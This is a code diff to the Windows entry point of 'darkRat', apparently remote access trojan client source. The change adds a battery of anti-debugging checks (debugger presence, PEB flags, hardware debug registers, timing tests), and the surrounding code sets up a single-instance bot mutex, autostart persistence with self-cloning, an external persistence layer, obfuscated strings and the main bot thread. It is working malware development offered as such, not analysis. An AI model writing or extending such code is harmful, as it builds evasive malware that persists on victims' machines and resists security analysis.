@@ -4,6 +4,7 @@
 #include <windows.h>
 #include <Urlmon.h> 
 #include <time.h>
+#include "antidbg.h"
 #include <lm.h>
 #include <vector>
 #include <thread>
@@ -67,32 +68,45 @@ int WINAPI WinMain(HINSTANCE hInstance,    // HANDLE TO AN INSTANCE.  This is th
 	SetUnhandledExceptionFilter(unhandled_exception_handler);
 	SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOALIGNMENTFAULTEXCEPT | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
 	_set_abort_behavior(0, _WRITE_ABORT_MSG | _CALL_REPORTFAULT);
+	
+	adbg_IsDebuggerPresent();
+	adbg_IsDebuggerPresent();
+	adbg_CheckRemoteDebuggerPresent();
+	adbg_BeingDebuggedPEB();
+	adbg_NtGlobalFlagPEB();
+	adbg_HardwareDebugRegisters();
+
+	adbg_RDTSC();
+	adbg_QueryPerformanceCounter();
+	adbg_GetTickCount();
+
+
 	darkRat::config::config config = darkRat::config::load();
-		//Config config;
-		std::thread darkMain;
+	//Config config;
+	std::thread darkMain;
 
-		//Check if the Bot is Running
-		std::string mutex = "Local\\" + config.mutex;
-		CreateMutexA(0, FALSE, mutex.c_str()); // try to create a named mutex
-		if (GetLastError() == ERROR_ALREADY_EXISTS) // did the mutex already exist?
-			return -1; // quit; mutex is released automatically
+	//Check if the Bot is Running
+	std::string mutex = "Local\\" + config.mutex;
+	CreateMutexA(0, FALSE, mutex.c_str()); // try to create a named mutex
+	if (GetLastError() == ERROR_ALREADY_EXISTS) // did the mutex already exist?
+		return -1; // quit; mutex is released automatically
 		
-		//Autostart  (with persistence) && Clone
-		if (config.startup == "true") {
-			std::string insatlled = Helpers::installedOrnot();
-			if (insatlled == OBFUSCATE("restart")) {
-				return 0;
-			}
+	//Autostart  (with persistence) && Clone
+	if (config.startup == "true") {
+		std::string insatlled = Helpers::installedOrnot();
+		if (insatlled == OBFUSCATE("restart")) {
+			return 0;
 		}
+	}
 
-		//Run External Persistence Object
-		if (config.persistence == "true") {
-			createLayer();
-			startLayer();
-		}
+	//Run External Persistence Object
+	if (config.persistence == "true") {
+		createLayer();
+		startLayer();
+	}
 
-		darkMain = std::thread(Client::darkMainThread, config);
-		darkMain.join();
+	darkMain = std::thread(Client::darkMainThread, config);
+	darkMain.join();
 
-		return 0;
+	return 0;
 }
